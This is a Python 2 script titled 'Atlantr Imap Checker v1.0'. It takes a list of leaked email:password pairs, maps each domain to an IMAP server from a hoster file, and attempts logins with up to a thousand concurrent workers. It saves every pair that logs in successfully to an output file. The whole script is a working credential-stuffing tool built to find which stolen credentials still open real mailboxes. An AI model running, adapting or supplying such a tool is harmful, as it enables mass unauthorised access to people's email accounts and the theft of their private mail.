#!/usr/bin/python
# _*_ coding:utf-8 _*_
import sys
import gevent #pip install gevent
from gevent.queue import *
import gevent.monkey
from timeit import default_timer as timer
import random
gevent.monkey.patch_all()
import imaplib
import email
import time
from progress.bar import Bar #pip install progress

asciii = """
                                   
,---.|    |              |         
|---||--- |    ,---.,---.|--- ,---.
|   ||    |    ,---||   ||    |    
`   '`---'`---'`---^`   '`---'`    
      Atlantr Imap Checker v1.0 - by SUP3RIA
      
""" 
print asciii


if sys.argv[1: ]:
    file_in = sys.argv[1]
else :
    file_in = "email_pass.txt"

if sys.argv[2: ]:
    file_out = sys.argv[2]
else :
    file_out = "out.txt"

if sys.argv[3: ]:
    workers = int(sys.argv[3]) + 1
else :
    workers = 1000

def write(i,file_out):
    with open(file_out, 'a') as file:
        file.write('{}'.format(i+'\n'))
    file.close()

def imap(usr, pw, host):
    usr = usr.lower()
    try:
        mail = imaplib.IMAP4_SSL(str(host))
        a = str(mail.login(usr, pw))
        return a[2: 4]
    except imaplib.IMAP4.error:
        return False
    except:
        return "Error"

def init_ImapConfig():
    global ImapConfig
    ImapConfig = {}
    with open("hoster.txt", "r") as f:
      for line in f:
          if len(line)>1:
              hoster = line.strip().split(':')
              ImapConfig[hoster[0]] = hoster[1]


def get_imapConfig(email):
    try:
        hoster = email.lower().split('@')[1]
        return ImapConfig[hoster]
    except:
        return False


def sub_worker(task):
    global count_valid 
    global count_invalid 
    global count_unmatched 
    task2 = task.split(':')
    host = get_imapConfig(task2[0])
    if host == False:
        write(task,file_out+'_unmatched')
        count_unmatched = count_unmatched + 1
        return False
        #q.task_done()
    l = imap(task2[0], task2[1], host)
    if l == 'OK':
        #print task, True
        write(task,file_out)
        count_valid = count_valid + 1
    if l == False:
        #print task, False
        count_invalid = count_invalid  + 1
    if l == "Error":
        #q.put(task)
        return False

def worker():
    while not q.empty():
        task = q.get()
        s = True
        try:
            s = sub_worker(task)
        finally:
            if s != False:
                gevent.sleep(random.uniform(0.01,0.09))
            bar.next()
            #q.task_done()

def loader():
    global linesSum
    with open(file_in, "r") as text_file:
        linesSum = 0
        for line in text_file:
            if len(line.strip()) > 1 and ':' in line.strip():
                try:
                    if '@' in line.split(':')[1] and '.' not in line.split(':')[0]:
                        a = line.split(':')[0].strip()
                        b = line.split(':')[1].strip()
                        line = b.lower()+':'+a
                    q.put(line.strip(),timeout=3)
                    linesSum += 1
                except:
                    pass


                     

def asynchronous():
    threads = []
    for i in range(0, workers):
        threads.append(gevent.spawn(worker))
    start = timer()
    gevent.joinall(threads,raise_error=True)
    end = timer()
    print "\n\nTime passed: " + str(end - start)[:6]
    print "\nFound",count_valid, "valid Accounts.","\n(",count_invalid,'invalid and for',count_unmatched,'no settings were found.)'


count_valid = 0
count_invalid = 0
count_unmatched = 0
linesSum = 0

init_ImapConfig()
q = gevent.queue.JoinableQueue()
gevent.spawn(loader).join()
bar = Bar('Processing', max=linesSum)
asynchronous()

